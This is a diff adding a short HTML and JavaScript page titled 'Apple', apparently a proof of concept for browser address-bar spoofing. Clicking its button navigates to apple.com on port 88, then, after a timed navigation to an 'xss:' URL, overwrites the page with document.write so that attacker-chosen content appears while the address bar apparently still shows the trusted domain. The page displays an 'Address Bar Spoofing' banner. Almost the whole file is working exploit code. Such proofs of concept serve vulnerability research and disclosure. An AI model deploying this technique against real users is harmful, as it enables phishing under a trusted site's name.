@@ -1,0 +1,52 @@
+<title>Apple</title>
+
+<script>
+function a(){
+    location="http://apple.com:88"
+    document.getElementById("img").style.display = "none";
+    document.getElementById("kata").style.display = "block";
+
+    setTimeout(() => {
+        location.replace('xss:')
+        document.getElementById("kata").style.display = "none";
+        setTimeout(() => {
+document.write(`
+<div style="
+    position:fixed;
+    inset:0;
+    background:#000;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial,sans-serif;
+">
+    <img
+        src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
+        style="
+            width:400px;
+            max-width:90vw;
+        "
+    >
+
+    <div style="
+        margin-top:20px;
+        color:#fff;
+        font-size:48px;
+        font-weight:900;
+        letter-spacing:4px;
+        text-shadow:0 0 10px #fff;
+    ">
+        Address Bar Spoofing
+    </div>
+</div>
+`);
+    }, 500);
+    }, 4000);
+}
+</script>
+
+<center>
+  <button id="img" onclick="a()">Click me</button>
+  <div id="kata" style="display:none">loading...</div>
+</center>
